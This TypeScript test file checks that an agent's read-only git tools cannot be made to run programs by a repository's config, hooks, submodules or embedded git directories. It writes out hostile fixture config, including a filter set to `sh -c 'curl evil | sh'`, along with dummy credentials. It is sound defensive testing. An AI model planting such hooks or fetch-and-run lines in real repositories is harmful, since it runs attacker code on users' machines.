/**
 * C007 — a repository's own config cannot make a read-only git tool run a
 * program.
 *
 * The fixture is a repository whose `.git/config` names a program for every
 * hook a read could reach: an fsmonitor hook, a textconv, an external diff
 * driver, a clean/smudge/process filter, and a gpg program for a commit
 * carrying a forged signature. Each program appends one line to a marker
 * file. The fixture is proved LIVE first — plain `git` fires each hook — so a
 * pass below cannot be a fixture that never fired anything.
 *
 * Global and system config are pointed at /dev/null for the whole file, so
 * the operator's own git config neither helps nor hurts.
 */
import { afterAll, afterEach, beforeAll, beforeEach, describe, expect, test } from "bun:test";
import {
  chmodSync,
  existsSync,
  mkdirSync,
  mkdtempSync,
  readFileSync,
  realpathSync,
  rmSync,
  utimesSync,
  writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import type { RegisteredTool } from "@crewhaus/tool-catalog";
import { GLOBAL_ARGS, runGit } from "./git-run";
import {
  hardenReadArgs,
  neutraliseRepositoryFilters,
  neutralisedNote,
  parseConfigListing,
} from "./hardening";
import {
  gitBlame,
  gitBranchList,
  gitConflicts,
  gitDiff,
  gitFileHistory,
  gitLog,
  gitMergeBase,
  gitRemoteList,
  gitRevParse,
  gitShow,
  gitStashList,
  gitStatus,
  gitTagList,
  gitWorktreeList,
} from "./index";

const DATE = "2026-02-03T04:05:06+00:00";

let workspace: string;
let repo: string;
let marker: string;
let originalCwd: string;
const saved: Record<string, string | undefined> = {};

function git(args: string[], cwd: string, input?: string): { code: number; out: string } {
  const r = Bun.spawnSync(["git", ...args], {
    cwd,
    env: { ...process.env, GIT_AUTHOR_DATE: DATE, GIT_COMMITTER_DATE: DATE },
    stdin: input === undefined ? "ignore" : new TextEncoder().encode(input),
    stdout: "pipe",
    stderr: "pipe",
  });
  return { code: r.exitCode, out: r.stdout.toString() };
}

/** A script that appends `label args` to the marker, then behaves as `body`. */
function hook(name: string, label: string, body: string): string {
  const file = join(workspace, `${name}.sh`);
  writeFileSync(file, `#!/bin/sh\necho "${label} $*" >> ${JSON.stringify(marker)}\n${body}\n`);
  chmodSync(file, 0o755);
  return file;
}

function ran(): string[] {
  return existsSync(marker) ? readFileSync(marker, "utf8").trim().split("\n") : [];
}

async function call(tool: RegisteredTool, input: Record<string, unknown>): Promise<string> {
  const result = await tool.execute({ cwd: "repo", ...input });
  return typeof result === "string" ? result : JSON.stringify(result);
}

beforeAll(() => {
  originalCwd = process.cwd();
  for (const key of ["GIT_CONFIG_GLOBAL", "GIT_CONFIG_SYSTEM"]) {
    saved[key] = process.env[key];
    process.env[key] = "/dev/null";
  }
});

afterAll(() => {
  for (const [key, value] of Object.entries(saved)) {
    if (value === undefined) Reflect.deleteProperty(process.env, key);
    else process.env[key] = value;
  }
});

beforeEach(() => {
  workspace = realpathSync(mkdtempSync(join(tmpdir(), "crewhaus-tool-git-cfg-")));
  marker = join(workspace, "RAN");
  repo = join(workspace, "repo");
  mkdirSync(repo);
  process.chdir(workspace);

  git(["init", "-q", "-b", "main"], repo);
  git(["config", "user.name", "A U Thor"], repo);
  git(["config", "user.email", "author@example.com"], repo);
  git(["config", "commit.gpgsign", "false"], repo);
  writeFileSync(join(repo, ".gitattributes"), "*.txt diff=pwn filter=pwn\n");
  writeFileSync(join(repo, "a.txt"), "one\n");
  writeFileSync(join(repo, "b.txt"), "steady\n");
  git(["add", "-A"], repo);
  git(["commit", "-q", "-m", "one"], repo);
  writeFileSync(join(repo, "a.txt"), "one\ntwo\n");
  git(["commit", "-q", "-am", "two"], repo);

  // A commit carrying a forged signature, on a branch of its own.
  const tree = git(["rev-parse", "HEAD^{tree}"], repo).out.trim();
  const parent = git(["rev-parse", "HEAD"], repo).out.trim();
  const body = [
    `tree ${tree}`,
    `parent ${parent}`,
    "author A U Thor <author@example.com> 1770000000 +0000",
    "committer A U Thor <author@example.com> 1770000000 +0000",
    "gpgsig -----BEGIN PGP SIGNATURE-----",
    " ",
    " iQ==",
    " -----END PGP SIGNATURE-----",
    "",
    "signed",
    "",
  ].join("\n");
  const signed = git(["hash-object", "-t", "commit", "-w", "--stdin"], repo, body).out.trim();
  git(["update-ref", "refs/heads/signed", signed], repo);

  // Now the hostile config, written the way an archive would carry it.
  git(["config", "core.fsmonitor", hook("fsmonitor", "fsmonitor", "exit 1")], repo);
  git(["config", "diff.pwn.textconv", hook("textconv", "textconv", 'cat "$1"')], repo);
  git(["config", "diff.pwn.command", hook("extdiff", "extdiff", "exit 0")], repo);
  const filter = hook("filter", "filter", "cat");
  git(["config", "filter.pwn.clean", filter], repo);
  git(["config", "filter.pwn.smudge", filter], repo);
  git(["config", "log.showSignature", "true"], repo);
  git(["config", "gpg.program", hook("gpg", "gpg", "cat >/dev/null; exit 1")], repo);

  // A content change, and a tracked file whose stat data changed but whose
  // bytes did not: git must hash that one through the clean filter.
  writeFileSync(join(repo, "a.txt"), "one\ntwo\nthree\n");
  const later = new Date(Date.now() + 120_000);
  utimesSync(join(repo, "b.txt"), later, later);
});

afterEach(() => {
  process.chdir(originalCwd);
  rmSync(workspace, { recursive: true, force: true });
});

describe("the fixture is live", () => {
  test("plain git fires every planted program", () => {
    git(["status", "--porcelain=v2"], repo);
    git(["diff"], repo);
    git(["log", "-1", "signed"], repo);
    git(["show", "HEAD"], repo);
    const labels = new Set(ran().map((line) => line.split(" ")[0]));
    expect([...labels].sort()).toEqual(["extdiff", "filter", "fsmonitor", "gpg", "textconv"]);
  }, 20_000);
});

describe("repository config cannot make a read run a program", () => {
  const READS: ReadonlyArray<[RegisteredTool, Record<string, unknown>]> = [
    [gitStatus, {}],
    [gitDiff, { mode: "patch" }],
    [gitDiff, { mode: "stat" }],
    [gitDiff, { mode: "numstat" }],
    [gitDiff, { mode: "nameOnly" }],
    [gitDiff, { mode: "patch", range: "HEAD~1..HEAD" }],
    [gitDiff, { mode: "patch", staged: true }],
    [gitShow, { ref: "HEAD" }],
    [gitShow, { ref: "signed" }],
    [gitShow, { ref: "HEAD", path: "a.txt" }],
    [gitLog, {}],
    [gitLog, { range: "signed" }],
    [gitBlame, { path: "a.txt" }],
    [gitBlame, { path: "b.txt" }],
    [gitBlame, { path: "a.txt", ref: "HEAD~1" }],
    [gitFileHistory, { path: "a.txt" }],
    [gitConflicts, {}],
    [gitStashList, {}],
    [gitBranchList, {}],
    [gitTagList, {}],
    [gitRemoteList, {}],
    [gitMergeBase, { a: "main", b: "signed" }],
    [gitRevParse, { refs: ["HEAD", "signed"] }],
    [gitWorktreeList, {}],
  ];

  test("every read-only git tool answers, and none of the planted programs runs", async () => {
    let checked = 0;
    for (const [tool, input] of READS) {
      rmSync(marker, { force: true });
      const text = await call(tool, input);
      const label = `${tool.name} ${JSON.stringify(input)}`;
      expect({ label, ran: ran() }).toEqual({ label, ran: [] });
      // An answer, not a refusal: each result is JSON.
      expect({ label, json: text.startsWith("{") }).toEqual({ label, json: true });
      checked += 1;
    }
    expect(checked).toBe(READS.length);
    expect(checked).toBeGreaterThanOrEqual(24);
  }, 60_000);

  test("the answers are still right, and say which filter was switched off", async () => {
    const status = JSON.parse(await call(gitStatus, {})) as Record<string, unknown>;
    expect(JSON.stringify(status)).toContain("a.txt");
    expect(String(status["repoConfigNote"])).toContain("filter.pwn");
    const patch = JSON.parse(await call(gitDiff, { mode: "patch" })) as Record<string, unknown>;
    expect(String(patch["patch"])).toContain("+three");
    expect(String(patch["repoConfigNote"])).toContain("filter.pwn");
    // A read whose answer no filter can change carries no note.
    const log = JSON.parse(await call(gitLog, {})) as Record<string, unknown>;
    expect(log["repoConfigNote"]).toBeUndefined();
  }, 30_000);

  test("a repository with no filter of its own gets no note and no overrides", async () => {
    git(["config", "--unset", "filter.pwn.clean"], repo);
    git(["config", "--unset", "filter.pwn.smudge"], repo);
    const status = JSON.parse(await call(gitStatus, {})) as Record<string, unknown>;
    expect(status["repoConfigNote"]).toBeUndefined();
  }, 20_000);

  test("a write keeps the repository's filters: a commit must store the cleaned bytes", async () => {
    // Guard on the other half of the rule: filters are switched off for reads
    // ONLY. GitAdd runs `add`, which must still go through the clean filter.
    const { gitAdd } = await import("./index");
    rmSync(marker, { force: true });
    await call(gitAdd, { paths: ["a.txt"] });
    expect(ran().some((line) => line.startsWith("filter"))).toBe(true);
    // …and its read-only follow-up (`diff --cached --numstat`) ran nothing
    // new: the only lines are the add's own filter runs.
    expect(ran().every((line) => line.startsWith("filter"))).toBe(true);
  }, 20_000);
});

/**
 * A read can WRITE the index: `git diff` that finds a tracked file whose stat
 * data changed but whose bytes did not refreshes the index and writes it
 * back, GIT_OPTIONAL_LOCKS=0 or not, and writing the index runs the
 * repository's `post-index-change` hook. `.git/hooks` arrives with a copied
 * checkout and needs no config at all; `core.hooksPath` can point anywhere.
 * Before each call b.txt gets a fresh, distinct mtime, so every call finds a
 * stale stat to refresh (the first refresh would otherwise fix it for good).
 */
describe("a repository's hooks never run from a read (C007)", () => {
  const HOOKS = ["post-index-change", "reference-transaction", "post-checkout", "pre-auto-gc"];
  let bumps = 0;
  const staleStat = (): void => {
    bumps += 1;
    const at = new Date(Date.UTC(2001, 0, 1, 0, bumps));
    utimesSync(join(repo, "b.txt"), at, at);
  };
  const plantHooks = (dir: string): void => {
    mkdirSync(dir, { recursive: true });
    for (const name of HOOKS) {
      const file = join(dir, name);
      writeFileSync(file, `#!/bin/sh\necho "hook:${name} $*" >> ${JSON.stringify(marker)}\n`);
      chmodSync(file, 0o755);
    }
  };
  const hookLines = (): string[] => ran().filter((line) => line.startsWith("hook:"));

  const withHooksAt = async (where: "git-dir" | "hooks-path"): Promise<number> => {
    if (where === "git-dir") plantHooks(join(repo, ".git", "hooks"));
    else {
      plantHooks(join(workspace, "shared-hooks"));
      git(["config", "core.hooksPath", join(workspace, "shared-hooks")], repo);
    }
    // Live: plain git diff runs the hook on its index write.
    rmSync(marker, { force: true });
    staleStat();
    git(["diff"], repo);
    expect({ where, live: hookLines() }).toEqual({ where, live: ["hook:post-index-change 0 0"] });

    let checked = 0;
    for (const [tool, input] of READS_FOR_HOOKS) {
      rmSync(marker, { force: true });
      staleStat();
      const text = await call(tool, input);
      const label = `${where} ${tool.name} ${JSON.stringify(input)}`;
      expect({ label, hooks: hookLines() }).toEqual({ label, hooks: [] });
      expect({ label, json: text.startsWith("{") }).toEqual({ label, json: true });
      checked += 1;
    }
    return checked;
  };

  test("from .git/hooks, with no config naming them", async () => {
    expect(await withHooksAt("git-dir")).toBe(READS_FOR_HOOKS.length);
  }, 60_000);

  test("from a core.hooksPath the repository's config names", async () => {
    expect(await withHooksAt("hooks-path")).toBe(READS_FOR_HOOKS.length);
  }, 60_000);
});

/** Every read-only tool; the diff family is the one whose run writes the index. */
const READS_FOR_HOOKS: ReadonlyArray<[RegisteredTool, Record<string, unknown>]> = [
  [gitDiff, { mode: "stat" }],
  [gitDiff, { mode: "patch" }],
  [gitDiff, { mode: "numstat" }],
  [gitDiff, { mode: "nameOnly" }],
  [gitConflicts, {}],
  [gitStatus, {}],
  [gitBlame, { path: "b.txt" }],
  [gitShow, { ref: "HEAD" }],
  [gitLog, {}],
  [gitFileHistory, { path: "a.txt" }],
  [gitStashList, {}],
  [gitBranchList, {}],
  [gitTagList, {}],
  [gitRemoteList, {}],
  [gitMergeBase, { a: "main", b: "signed" }],
  [gitRevParse, { refs: ["HEAD"] }],
  [gitWorktreeList, {}],
];

describe("an embedded repository directory is not a place a read runs git", () => {
  test("a committed gitdir-shaped directory, cloned, is refused and runs nothing", async () => {
    // The clone-only vector: an outer repository commits a directory laid out
    // as a git dir (HEAD, config, objects, refs) whose config names an
    // fsmonitor hook and a worktree. Running git INSIDE it uses that config.
    const outer = join(workspace, "outer");
    mkdirSync(join(outer, "evil", "objects"), { recursive: true });
    mkdirSync(join(outer, "evil", "refs"), { recursive: true });
    writeFileSync(join(outer, "evil", "objects", ".keep"), "");
    writeFileSync(join(outer, "evil", "refs", ".keep"), "");
    writeFileSync(join(outer, "evil", "HEAD"), "ref: refs/heads/main\n");
    writeFileSync(
      join(outer, "evil", "config"),
      `[core]\n\trepositoryformatversion = 0\n\tbare = false\n\tworktree = ..\n\tfsmonitor = ${hook("inner", "inner-fsmonitor", "exit 1")}\n`,
    );
    git(["init", "-q", "-b", "main"], outer);
    git(["-c", "user.name=x", "-c", "user.email=x@x", "add", "-A"], outer);
    git(["-c", "user.name=x", "-c", "user.email=x@x", "commit", "-q", "-m", "outer"], outer);
    expect(
      git(["clone", "-q", "--no-local", outer, join(workspace, "clone")], workspace).code,
    ).toBe(0);

    // Live: plain git inside the cloned directory runs the committed hook.
    rmSync(marker, { force: true });
    git(["status"], join(workspace, "clone", "evil"));
    expect(ran().length).toBeGreaterThan(0);

    for (const tool of [gitStatus, gitDiff, gitLog]) {
      rmSync(marker, { force: true });
      const result = await tool.execute({ cwd: "clone/evil" });
      const label = tool.name;
      expect({ label, ran: ran() }).toEqual({ label, ran: [] });
      expect({
        label,
        refused: String(result).includes("is a repository directory itself"),
      }).toEqual({
        label,
        refused: true,
      });
    }
  }, 30_000);
});

/**
 * A superproject whose own config says `diff.submodule=diff`, over a
 * submodule whose config (`.git/modules/sub/config`, the submodule's, not
 * the superproject's) names an external diff program and a textconv. git
 * renders that inline submodule diff by running a child `git diff` inside the
 * submodule, and passes it neither `--no-ext-diff` nor `--no-textconv`.
 */
function plantSubmodule(): string {
  const who = ["-c", "user.name=A", "-c", "user.email=a@example.com"];
  const src = join(workspace, "subsrc");
  const sup = join(workspace, "sup");
  mkdirSync(src);
  mkdirSync(sup);
  git(["init", "-q", "-b", "main"], src);
  writeFileSync(join(src, "f.txt"), "one\n");
  git([...who, "add", "f.txt"], src);
  git([...who, "commit", "-q", "-m", "one"], src);
  git(["init", "-q", "-b", "main"], sup);
  writeFileSync(join(sup, "top.txt"), "top\n");
  git([...who, "add", "top.txt"], sup);
  git([...who, "commit", "-q", "-m", "top"], sup);
  git(["-c", "protocol.file.allow=always", "submodule", "add", "-q", src, "sub"], sup);
  git([...who, "commit", "-q", "-m", "add sub"], sup);
  writeFileSync(join(sup, "sub", "f.txt"), "two\n");
  git([...who, "commit", "-q", "-am", "two"], join(sup, "sub"));
  git([...who, "commit", "-q", "-am", "bump sub"], sup);
  git(["config", "diff.submodule", "diff"], sup);
  const subConfig = join(sup, ".git", "modules", "sub", "config");
  git(["config", "-f", subConfig, "diff.external", hook("subext", "sub-extdiff", "exit 0")], sup);
  git(
    ["config", "-f", subConfig, "diff.x.textconv", hook("subconv", "sub-textconv", 'cat "$1"')],
    sup,
  );
  mkdirSync(join(sup, ".git", "modules", "sub", "info"), { recursive: true });
  writeFileSync(join(sup, ".git", "modules", "sub", "info", "attributes"), "* diff=x\n");
  return sup;
}

describe("a submodule's config cannot make a read run a program", () => {
  test("the fixture is live: plain git show and diff run the submodule's programs", () => {
    const sup = plantSubmodule();
    rmSync(marker, { force: true });
    git(["show", "HEAD"], sup);
    expect(ran().some((line) => line.startsWith("sub-extdiff"))).toBe(true);
    // With the external driver unset, the textconv is what runs.
    git(
      ["config", "-f", join(sup, ".git", "modules", "sub", "config"), "--unset", "diff.external"],
      sup,
    );
    rmSync(marker, { force: true });
    git(["diff", "HEAD~1..HEAD"], sup);
    expect(ran().some((line) => line.startsWith("sub-textconv"))).toBe(true);
  }, 20_000);

  test("GitShow, GitDiff and GitLog cross the submodule pointer and run nothing", async () => {
    plantSubmodule();
    const reads: ReadonlyArray<[RegisteredTool, Record<string, unknown>]> = [
      [gitShow, { cwd: "sup", ref: "HEAD" }],
      [gitDiff, { cwd: "sup", range: "HEAD~1..HEAD", mode: "patch" }],
      [gitDiff, { cwd: "sup", ref: "HEAD~1", mode: "patch" }],
      [gitDiff, { cwd: "sup", range: "HEAD~1..HEAD", mode: "stat" }],
      [gitLog, { cwd: "sup" }],
    ];
    let checked = 0;
    for (const [tool, input] of reads) {
      rmSync(marker, { force: true });
      const text = String(await tool.execute(input));
      const label = `${tool.name} ${JSON.stringify(input)}`;
      expect({ label, ran: ran() }).toEqual({ label, ran: [] });
      expect({ label, json: text.startsWith("{") }).toEqual({ label, json: true });
      checked += 1;
    }
    expect(checked).toBe(5);
    // The pointer change is still reported, in git's default short form.
    const patch = JSON.parse(
      String(await gitDiff.execute({ cwd: "sup", range: "HEAD~1..HEAD", mode: "patch" })),
    ) as Record<string, unknown>;
    expect(String(patch["patch"])).toContain("+Subproject commit ");
  }, 30_000);
});

describe("a read does not open a file the repository's config names outside it", () => {
  test("GitBlame echoes neither blame.ignoreRevsFile nor a mailmap.file", async () => {
    const outside = mkdtempSync(join(tmpdir(), "crewhaus-tool-git-outside-"));
    try {
      const secret = join(outside, "netrc-like");
      writeFileSync(secret, "machine api.example.com login bot password hunter2-SECRET\n");
      const mailmap = join(outside, "mailmap");
      writeFileSync(mailmap, "Leaked Mailmap Line <author@example.com>\n");
      git(["config", "--unset", "filter.pwn.clean"], repo);
      git(["config", "--unset", "filter.pwn.smudge"], repo);
      // Live: plain git echoes the first file's line and maps through the second.
      git(["config", "blame.ignoreRevsFile", secret], repo);
      const plain = Bun.spawnSync(["git", "blame", "--line-porcelain", "a.txt"], {
        cwd: repo,
        stdout: "pipe",
        stderr: "pipe",
      });
      expect(plain.stderr.toString()).toContain("hunter2-SECRET");

      const refused = String(await gitBlame.execute({ cwd: "repo", path: "a.txt" }));
      expect(refused).not.toContain("hunter2");
      expect(refused.startsWith("{")).toBe(true);

      git(["config", "--unset", "blame.ignoreRevsFile"], repo);
      git(["config", "mailmap.file", mailmap], repo);
      const mapped = Bun.spawnSync(["git", "blame", "--line-porcelain", "a.txt"], {
        cwd: repo,
        stdout: "pipe",
        stderr: "pipe",
      });
      expect(mapped.stdout.toString()).toContain("Leaked Mailmap Line");
      const blamed = String(await gitBlame.execute({ cwd: "repo", path: "a.txt" }));
      expect(blamed).not.toContain("Leaked Mailmap Line");
      expect(blamed).toContain("A U Thor");
    } finally {
      rmSync(outside, { recursive: true, force: true });
    }
  }, 20_000);
});

describe("a read's environment", () => {
  test("carries none of the harness's credentials; a write's keeps them", async () => {
    // An alias is the one program a test can make git run on purpose; it
    // records the environment a read's git hands its children.
    const key = ["sk-ant-api03-", "G".repeat(24), "itread00"].join("");
    const prior = process.env["CREWHAUS_TEST_API_KEY"];
    process.env["CREWHAUS_TEST_API_KEY"] = key;
    try {
      const out = join(workspace, "env.txt");
      const alias = ["-c", `alias.envdump=!env > ${JSON.stringify(out)}`, "envdump"];
      await runGit(alias, { cwd: repo, timeoutMs: 10_000, readOnly: true });
      const readEnv = readFileSync(out, "utf8");
      expect(readEnv.includes(key)).toBe(false);
      expect(/^PATH=/m.test(readEnv)).toBe(true);
      expect(/^GIT_OPTIONAL_LOCKS=0$/m.test(readEnv)).toBe(true);
      rmSync(out);
      await runGit(alias, { cwd: repo, timeoutMs: 10_000 });
      expect(readFileSync(out, "utf8").includes(key)).toBe(true);
    } finally {
      if (prior === undefined) Reflect.deleteProperty(process.env, "CREWHAUS_TEST_API_KEY");
      else process.env["CREWHAUS_TEST_API_KEY"] = prior;
    }
  }, 20_000);
});

describe("the index a commit hook is handed", () => {
  function cleanRepo(name: string): string {
    const dir = join(workspace, name);
    mkdirSync(dir);
    git(["init", "-q", "-b", "main"], dir);
    git(["config", "user.name", "A"], dir);
    git(["config", "user.email", "a@example.com"], dir);
    git(["config", "commit.gpgsign", "false"], dir);
    writeFileSync(join(dir, "a.txt"), "a\n");
    writeFileSync(join(dir, "b.txt"), "b\n");
    git(["add", "-A"], dir);
    git(["commit", "-q", "-m", "init"], dir);
    return dir;
  }

  test("a harness run from prepare-commit-msg sees what `git commit -a` is committing", async () => {
    // git hands the hook GIT_INDEX_FILE=.git/index.lock: the index being
    // committed. Dropping it read .git/index, where nothing is staged, and
    // reported the commit as empty.
    const dir = cleanRepo("hooked");
    const out = join(workspace, "seen.json");
    const agent = join(workspace, "hook-agent.ts");
    writeFileSync(
      agent,
      [
        `import { gitDiff } from ${JSON.stringify(join(import.meta.dir, "index.ts"))};`,
        `process.chdir(${JSON.stringify(workspace)});`,
        `const text = String(await gitDiff.execute({ cwd: "hooked", staged: true, mode: "nameOnly" }));`,
        `await Bun.write(${JSON.stringify(out)}, JSON.stringify({ index: process.env.GIT_INDEX_FILE ?? null, text }));`,
      ].join("\n"),
    );
    const hookFile = join(dir, ".git", "hooks", "prepare-commit-msg");
    writeFileSync(
      hookFile,
      `#!/bin/sh\nexec ${JSON.stringify(process.execPath)} ${JSON.stringify(agent)}\n`,
    );
    chmodSync(hookFile, 0o755);
    writeFileSync(join(dir, "a.txt"), "a\na2\n"); // tracked, NOT staged
    expect(git(["commit", "-q", "-a", "-m", "commit -a"], dir).code).toBe(0);
    const seen = JSON.parse(readFileSync(out, "utf8")) as { index: string | null; text: string };
    // Live: git really handed the hook an index other than .git/index.
    expect(seen.index).not.toBeNull();
    expect(String(seen.index).endsWith(join(".git", "index"))).toBe(false);
    expect(JSON.parse(seen.text)).toEqual({ mode: "nameOnly", files: 1, paths: ["a.txt"] });
  }, 30_000);

  test("an inherited GIT_INDEX_FILE that is another repository's is not read", async () => {
    const mine = cleanRepo("mine");
    const other = cleanRepo("other");
    writeFileSync(join(other, "b.txt"), "b\nstaged elsewhere\n");
    git(["add", "b.txt"], other);
    const prior = process.env["GIT_INDEX_FILE"];
    process.env["GIT_INDEX_FILE"] = join(other, ".git", "index");
    try {
      const text = String(await gitDiff.execute({ cwd: "mine", staged: true, mode: "nameOnly" }));
      expect(JSON.parse(text)).toEqual({ mode: "nameOnly", files: 0, paths: [] });
      // The same variable IS honoured for the repository it belongs to.
      const theirs = String(
        await gitDiff.execute({ cwd: "other", staged: true, mode: "nameOnly" }),
      );
      expect(JSON.parse(theirs)).toEqual({ mode: "nameOnly", files: 1, paths: ["b.txt"] });
    } finally {
      if (prior === undefined) Reflect.deleteProperty(process.env, "GIT_INDEX_FILE");
      else process.env["GIT_INDEX_FILE"] = prior;
    }
    expect(mine).not.toBe(other);
  }, 20_000);
});

describe("git config passed through the environment", () => {
  test("GIT_CONFIG_COUNT with safe.directory still reaches every read and write", async () => {
    // `KEY` marks a credential-shaped name, so the read environment dropped
    // GIT_CONFIG_KEY_0, kept the count, and git refused to start: every git
    // tool answered "not a git repository".
    const names = ["GIT_CONFIG_COUNT", "GIT_CONFIG_KEY_0", "GIT_CONFIG_VALUE_0"];
    const prior = names.map((n) => process.env[n]);
    process.env["GIT_CONFIG_COUNT"] = "1";
    process.env["GIT_CONFIG_KEY_0"] = "safe.directory";
    process.env["GIT_CONFIG_VALUE_0"] = "*";
    try {
      const { gitBranchCreate } = await import("./index");
      let answered = 0;
      for (const [tool, input] of [
        [gitStatus, {}],
        [gitLog, {}],
        [gitDiff, { mode: "stat" }],
        [gitBranchCreate, { name: "via-env-config" }],
      ] as ReadonlyArray<[RegisteredTool, Record<string, unknown>]>) {
        const text = await call(tool, input);
        expect({ tool: tool.name, text: text.slice(0, 1) }).toEqual({ tool: tool.name, text: "{" });
        answered += 1;
      }
      expect(answered).toBe(4);
      // …and the env config really reached git: a read shows the value.
      const shown = await runGit(["config", "--get", "safe.directory"], {
        cwd: repo,
        timeoutMs: 10_000,
        readOnly: true,
      });
      expect(shown.stdout.trim()).toBe("*");
    } finally {
      names.forEach((n, i) => {
        const value = prior[i];
        if (value === undefined) Reflect.deleteProperty(process.env, n);
        else process.env[n] = value;
      });
    }
  }, 30_000);

  test("a git failure that is not 'no repository' is reported as git's own error", async () => {
    const names = ["GIT_CONFIG_COUNT", "GIT_CONFIG_KEY_0", "GIT_CONFIG_VALUE_0"];
    const prior = names.map((n) => process.env[n]);
    // A count git rejects outright: the harness's environment is broken,
    // and saying "not a git repository" would send the caller elsewhere.
    process.env["GIT_CONFIG_COUNT"] = "1";
    process.env["GIT_CONFIG_KEY_0"] = "no-dot-so-invalid";
    process.env["GIT_CONFIG_VALUE_0"] = "x";
    try {
      const text = await call(gitStatus, {});
      expect(text).not.toContain("not a git repository");
      expect(text).toContain("GitStatus failed (git exit");
    } finally {
      names.forEach((n, i) => {
        const value = prior[i];
        if (value === undefined) Reflect.deleteProperty(process.env, n);
        else process.env[n] = value;
      });
    }
  }, 20_000);
});

describe("the hardening, piece by piece", () => {
  test("every invocation switches off fsmonitor, signatures and implicit bare repositories", () => {
    const pairs = new Set<string>();
    for (let i = 0; i < GLOBAL_ARGS.length - 1; i++) {
      if (GLOBAL_ARGS[i] === "-c") pairs.add(GLOBAL_ARGS[i + 1] as string);
    }
    for (const want of [
      "core.fsmonitor=false",
      "log.showSignature=false",
      "safe.bareRepository=explicit",
      "diff.submodule=short",
    ]) {
      expect(pairs.has(want)).toBe(true);
    }
  });

  test("a diff-producing read is told not to run a driver; others are left alone", () => {
    expect(hardenReadArgs(["diff", "--stat", "--", "x"])).toEqual([
      "diff",
      "--no-ext-diff",
      "--no-textconv",
      "--ignore-submodules=dirty",
      "--stat",
      "--",
      "x",
    ]);
    expect(hardenReadArgs(["show", "--no-ext-diff", "HEAD"])).toEqual([
      "show",
      "--no-textconv",
      "--no-ext-diff",
      "HEAD",
    ]);
    expect(hardenReadArgs(["blame", "--line-porcelain", "--", "a"])).toEqual([
      "blame",
      "--no-ext-diff",
      "--no-textconv",
      "--no-ignore-revs-file",
      "--line-porcelain",
      "--",
      "a",
    ]);
    expect(hardenReadArgs(["status", "-z"])).toEqual(["status", "--ignore-submodules=dirty", "-z"]);
    expect(hardenReadArgs(["remote", "-v"])).toEqual(["remote", "-v"]);
    expect(hardenReadArgs([])).toEqual([]);
  });

  const listing = (...records: Array<[scope: string, key: string, value?: string]>) =>
    records
      .map(
        ([scope, key, value]) =>
          `${scope}\u0000${key}${value === undefined ? "" : `\n${value}`}\u0000`,
      )
      .join("");

  test("the config listing parses, implicit true and empty values included", () => {
    expect(
      parseConfigListing(
        listing(["local", "filter.a.clean", ""], ["global", "filter.b.required"]),
        true,
      ),
    ).toEqual([
      { scope: "local", key: "filter.a.clean", value: "" },
      { scope: "global", key: "filter.b.required", value: null },
    ]);
    expect(parseConfigListing("filter.a.clean\nx\u0000", false)).toEqual([
      { scope: "local", key: "filter.a.clean", value: "x" },
    ]);
  });

  test("only the repository's own drivers are switched off, and the stock LFS setup is kept", () => {
    const result = neutraliseRepositoryFilters(
      listing(
        ["local", "filter.nb.strip.clean", "nbstripout"],
        ["worktree", "filter.crypt.smudge", "evil"],
        ["global", "filter.operator.clean", "their-own-tool"],
        ["system", "filter.lfs.process", "git-lfs filter-process"],
        ["local", "filter.lfs.clean", "git-lfs clean -- %f"],
        ["local", "filter.lfs.smudge", "git-lfs smudge -- %f"],
        ["local", "filter.lfs.process", "git-lfs filter-process"],
        ["local", "filter.lfs.required", "true"],
        ["local", "filter.clean", "no-driver-name"],
      ),
      true,
    );
    expect(result).toEqual({
      ok: true,
      neutralised: ["filter.crypt", "filter.nb.strip"],
      configArgs: [
        "-c",
        "filter.crypt.clean=",
        "-c",
        "filter.crypt.smudge=",
        "-c",
        "filter.crypt.process=",
        "-c",
        "filter.crypt.required=false",
        "-c",
        "filter.nb.strip.clean=",
        "-c",
        "filter.nb.strip.smudge=",
        "-c",
        "filter.nb.strip.process=",
        "-c",
        "filter.nb.strip.required=false",
      ],
    });
    // An lfs driver the repository changed is switched off like any other.
    const changed = neutraliseRepositoryFilters(
      listing(["local", "filter.lfs.clean", "sh -c 'curl evil | sh'"]),
      true,
    );
    expect(changed.ok && changed.neutralised).toEqual(["filter.lfs"]);
    expect(neutralisedNote([])).toBeUndefined();
  });

  test("a driver name -c cannot spell is refused, not skipped", () => {
    const result = neutraliseRepositoryFilters(listing(["local", "filter.a=b.clean", "x"]), true);
    expect(result.ok).toBe(false);
    expect(!result.ok && result.reason).toContain("cannot switch off");
  });
});
